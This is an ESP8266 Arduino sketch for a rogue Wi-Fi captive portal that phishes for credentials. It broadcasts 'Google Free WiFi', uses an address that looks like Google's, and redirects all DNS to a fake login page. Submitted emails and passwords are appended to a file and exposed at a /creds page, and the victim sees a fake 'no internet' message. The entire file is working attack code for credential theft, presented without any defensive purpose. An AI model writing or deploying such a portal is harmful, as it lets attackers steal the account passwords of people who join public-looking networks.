#include <ESP8266WiFi.h>
#include <DNSServer.h>
#include <ESP8266WebServer.h>
#include <FS.h>
const byte DNS_PORT = 53;
IPAddress apIP(172, 217, 28, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
String indexData;
String credsData;
String input(String argName) {
  String a=webServer.arg(argName);
  a.replace("<","&lt;");a.replace(">","&gt;");
  a.substring(0,200); return a; }
  
String posted() {
  String email=input("email");
  String password=input("password");
  String Credentials="Email: " + email + " Password:" + password ;
  WriteToTextFile(Credentials);
  Serial.println(Credentials);
  return "<p>Internet access is not available at this time. Please try again later.</p>";
}
void WriteToTextFile(String text){
  File file = SPIFFS.open("/creds.txt", "a");
  if (!file) {
    Serial.println("Error opening file for appending");
    return;
}
int bytesWritten = file.println(text+"<br>");
if (bytesWritten > 0) {
    Serial.println("File was appended");
    Serial.println(bytesWritten);
 
} else {
    Serial.println("File append failed");
}
  
file.close();
return;  
  }
  String Creds(){
    Serial.println("Opening file for reading");
    File creds = SPIFFS.open("/creds.txt","r");
if(!creds){
    Serial.println("Failed to open file for reading");
    return "Error";
}
  Serial.println("File opened for reading");
   credsData ="";
   while (creds.available()){
   credsData += char(creds.read());
          }
          Serial.println("Credentials read from file");
          creds.close();
          Serial.println("File closed");
          return "<p>"+credsData+"</p>";
    
    
    }
    void BLINK() { // The internal LED will blink 5 times when a password is received.
  int count = 0;
  while(count < 5){
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}
void setup() {
  Serial.begin(115200);

 //Mount FS and read index.html into string
  if(!SPIFFS.begin()){
     Serial.println("An Error has occurred while mounting SPIFFS");
     return;
}
  File index = SPIFFS.open("/index.html","r");
if(!index){
    Serial.println("Failed to open file for reading");
    return;
}
   
   while (index.available()){
    indexData += char(index.read());
          }
          index.close();

  //start Wifi AP
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP("Google Free WiFi");

  // if DNSServer is started with "*" for domain name, it will reply with
  // provided IP to all DNS request
  dnsServer.start(DNS_PORT, "*", apIP);
  //handle post request
  webServer.on("/post",[]() { webServer.send(200, "text/html", posted()); BLINK(); });
  webServer.on("/creds",[]() { webServer.send(200, "text/html", Creds()); });
  // replay to all requests with same HTML
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", indexData);
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
